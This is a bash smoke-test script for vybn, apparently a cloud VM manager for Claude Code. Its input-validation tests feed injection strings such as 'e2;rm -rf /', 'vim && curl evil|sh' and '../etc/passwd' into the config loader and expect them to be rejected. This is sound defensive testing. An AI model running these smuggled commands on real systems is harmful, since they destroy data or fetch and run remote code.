#!/usr/bin/env bash
# Smoke tests for vybn — runs without cloud credentials
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
VYBN_ROOT="${SCRIPT_DIR}/.."

pass=0
fail=0

ok() {
    echo "  PASS: $1"
    pass=$((pass + 1))
}

fail() {
    echo "  FAIL: $1"
    fail=$((fail + 1))
}

echo "=== vybn smoke tests ==="
echo

# --- Test: vybn help ---
echo "--- vybn help ---"

help_output="$("${VYBN_ROOT}/vybn" help 2>&1)" || true
if echo "$help_output" | grep -q "vybn — Cloud Claude Code VM manager"; then
    ok "help contains banner text"
else
    fail "help missing banner text"
fi

if echo "$help_output" | grep -q "check"; then
    ok "help lists check command"
else
    fail "help missing check command"
fi

# --- Test: vybn version ---
echo "--- vybn version ---"

# Extract expected version from config.sh
expected_version="$(grep '^VYBN_VERSION=' "${VYBN_ROOT}/lib/config.sh" | cut -d'"' -f2)"
version_output="$("${VYBN_ROOT}/vybn" version 2>&1)" || true
if [[ "$version_output" == "vybn ${expected_version}" ]]; then
    ok "version output matches VYBN_VERSION (${expected_version})"
else
    fail "version mismatch: got '${version_output}', expected 'vybn ${expected_version}'"
fi

# --- Test: unknown command ---
echo "--- unknown command ---"

if "${VYBN_ROOT}/vybn" not-a-real-command 2>&1; then
    fail "unknown command should exit non-zero"
else
    unknown_output="$("${VYBN_ROOT}/vybn" not-a-real-command 2>&1)" || true
    if echo "$unknown_output" | grep -q "Unknown command"; then
        ok "unknown command shows error message"
    else
        fail "unknown command missing 'Unknown command' in output"
    fi
fi

# --- Test: all lib modules source cleanly and define main() ---
echo "--- lib modules ---"

for module in "${VYBN_ROOT}"/lib/*.sh; do
    basename="$(basename "$module")"
    # Skip config.sh — it's not a command module
    [[ "$basename" == "config.sh" ]] && continue

    # Source in a subshell with VYBN_PROJECT set to skip gcloud auto-detect
    result="$(
        export VYBN_PROJECT="test-project"
        export VYBN_DIR="${VYBN_ROOT}"
        (
            source "${VYBN_ROOT}/lib/config.sh"
            source "$module"
            if declare -f main &>/dev/null; then
                echo "ok"
            else
                echo "no-main"
            fi
        ) 2>&1
    )" || true

    if [[ "$result" == "ok" ]]; then
        ok "${basename} sources cleanly and defines main()"
    else
        fail "${basename}: ${result}"
    fi
done

# --- Test: provider interface functions ---
echo "--- provider interface ---"

provider_functions=(
    provider_require_cli
    provider_detect_project
    provider_vm_exists
    provider_vm_status
    provider_vm_info
    provider_vm_create
    provider_vm_start
    provider_vm_stop
    provider_vm_delete
)

result="$(
    export VYBN_PROJECT="test-project"
    export VYBN_DIR="${VYBN_ROOT}"
    (
        source "${VYBN_ROOT}/lib/config.sh"
        missing=""
        for fn in "${provider_functions[@]}"; do
            if ! declare -f "$fn" &>/dev/null; then
                missing="${missing} ${fn}"
            fi
        done
        if [[ -z "$missing" ]]; then
            echo "ok"
        else
            echo "missing:${missing}"
        fi
    ) 2>&1
)" || true

if [[ "$result" == "ok" ]]; then
    ok "all provider interface functions defined (${VYBN_PROVIDER:-gcp})"
else
    fail "provider interface: ${result}"
fi

# --- Test: network interface functions ---
echo "--- network interface ---"

network_functions=(
    net_setup
    net_teardown
    net_status
    net_ssh_raw
    vybn_ssh
    vybn_ssh_interactive
    net_tunnel
)

for network in iap tailscale; do
    result="$(
        export VYBN_PROJECT="test-project"
        export VYBN_DIR="${VYBN_ROOT}"
        export VYBN_NETWORK="${network}"
        (
            source "${VYBN_ROOT}/lib/config.sh"
            missing=""
            for fn in "${network_functions[@]}"; do
                if ! declare -f "$fn" &>/dev/null; then
                    missing="${missing} ${fn}"
                fi
            done
            if [[ -z "$missing" ]]; then
                echo "ok"
            else
                echo "missing:${missing}"
            fi
        ) 2>&1
    )" || true

    if [[ "$result" == "ok" ]]; then
        ok "all network interface functions defined (${network})"
    else
        fail "network interface (${network}): ${result}"
    fi
done

# --- Test: --help flag works for command modules ---
echo "--- --help per command ---"

commands=(init deploy connect session sync-skills start stop destroy status ssh add-key tunnel check switch-network logs update)

for cmd in "${commands[@]}"; do
    help_output="$(
        export VYBN_PROJECT="test-project"
        export VYBN_DIR="${VYBN_ROOT}"
        "${VYBN_ROOT}/vybn" "$cmd" --help 2>&1
    )" || true

    if [[ -n "$help_output" ]]; then
        ok "${cmd} --help produces output"
    else
        fail "${cmd} --help produces no output"
    fi
done

# --- Test: input validation ---
echo "--- input validation ---"

# Bad VYBN_MACHINE_TYPE
result="$(VYBN_MACHINE_TYPE="e2;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_MACHINE_TYPE"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_MACHINE_TYPE rejected"
    else
        fail "wrong error for bad VYBN_MACHINE_TYPE: ${result}"
    fi
}

# Bad VYBN_USER
result="$(VYBN_USER="root;evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_USER"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_USER rejected"
    else
        fail "wrong error for bad VYBN_USER: ${result}"
    fi
}

# Bad VYBN_TERM
result="$(VYBN_TERM='xterm;echo pwned' VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_TERM"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_TERM rejected"
    else
        fail "wrong error for bad VYBN_TERM: ${result}"
    fi
}

# Bad VYBN_SSHID (path traversal)
result="$(VYBN_SSHID="../etc/passwd" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_SSHID"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_SSHID rejected"
    else
        fail "wrong error for bad VYBN_SSHID: ${result}"
    fi
}

# Bad VYBN_PROVIDER (path traversal)
result="$(VYBN_PROVIDER="../etc" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_PROVIDER"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_PROVIDER rejected"
    else
        fail "wrong error for bad VYBN_PROVIDER: ${result}"
    fi
}

# Bad VYBN_TOOLCHAINS (injection)
result="$(VYBN_TOOLCHAINS="node;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_TOOLCHAINS"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_TOOLCHAINS rejected"
    else
        fail "wrong error for bad VYBN_TOOLCHAINS: ${result}"
    fi
}

# Bad VYBN_APT_PACKAGES (injection via &&)
result="$(VYBN_APT_PACKAGES="vim && curl evil|sh" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_APT_PACKAGES"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_APT_PACKAGES rejected"
    else
        fail "wrong error for bad VYBN_APT_PACKAGES: ${result}"
    fi
}

# Bad VYBN_NPM_PACKAGES (injection via semicolon)
result="$(VYBN_NPM_PACKAGES="typescript; curl evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
    fail "should reject bad VYBN_NPM_PACKAGES"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_NPM_PACKAGES rejected"
    else
        fail "wrong error for bad VYBN_NPM_PACKAGES: ${result}"
    fi
}

# Bad VYBN_VM_NAME (lazy validation via _validate_gcp_params)
# Use a fake HOME to prevent ~/.vybnrc from overriding test values
_fake_home="$(mktemp -d)"
result="$(VYBN_VM_NAME="9invalid" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_gcp_params' 2>&1)" && {
    fail "should reject bad VYBN_VM_NAME"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_VM_NAME rejected"
    else
        fail "wrong error for bad VYBN_VM_NAME: ${result}"
    fi
}

# Bad VYBN_ZONE (lazy validation via _validate_gcp_params)
result="$(VYBN_ZONE="not-a-zone" VYBN_VM_NAME="test-vm" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_gcp_params' 2>&1)" && {
    fail "should reject bad VYBN_ZONE"
} || {
    if echo "$result" | grep -qi "invalid"; then
        ok "bad VYBN_ZONE rejected"
    else
        fail "wrong error for bad VYBN_ZONE: ${result}"
    fi
}
# Empty VYBN_VM_NAME rejected by _validate_gcp_params
result="$(VYBN_VM_NAME="" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
    bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_gcp_params' 2>&1)" && {
    fail "should reject empty VYBN_VM_NAME"
} || {
    if echo "$result" | grep -qi "empty"; then
        ok "empty VYBN_VM_NAME rejected"
    else
        fail "wrong error for empty VYBN_VM_NAME: ${result}"
    fi
}

# _resolve_vm_name generates a valid GCP-compatible name
result="$(VYBN_VM_NAME="" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
    bash -c '
        source "${VYBN_DIR}/lib/config.sh"
        _resolve_vm_name
        if [[ "$VYBN_VM_NAME" =~ ^[a-z][a-z0-9-]{0,61}[a-z0-9]$ ]]; then
            echo "ok"
        else
            echo "bad-name: ${VYBN_VM_NAME}"
        fi
    ' 2>&1)" || true

if [[ "$result" == "ok" ]]; then
    ok "_resolve_vm_name generates valid GCP name"
else
    fail "_resolve_vm_name: ${result}"
fi

rm -rf "${_fake_home}"

# --- Test: toolchain modules ---
echo "--- toolchain modules ---"

for tc_module in "${VYBN_ROOT}"/vm-setup/toolchains/*.sh; do
    tc_name="$(basename "$tc_module" .sh)"
    expected_fn="setup_toolchain_${tc_name}"

    result="$(
        (
            # Provide stub variables that base.sh normally defines
            CLAUDE_USER="claude"
            CLAUDE_HOME="/home/claude"
            LOG="/dev/null"
            NVM_VERSION="v0.40.1"
            NVM_SHA256="test"
            log() { :; }
            source "$tc_module"
            if declare -f "$expected_fn" &>/dev/null; then
                echo "ok"
            else
                echo "no-function"
            fi
        ) 2>&1
    )" || true

    if [[ "$result" == "ok" ]]; then
        ok "${tc_name}.sh defines ${expected_fn}()"
    else
        fail "${tc_name}.sh: expected ${expected_fn}(), got: ${result}"
    fi
done

# --- Summary ---
echo
echo "=== Results: ${pass} passed, ${fail} failed ==="

if (( fail > 0 )); then
    exit 1
else
    echo "All tests passed."
    exit 0
fi
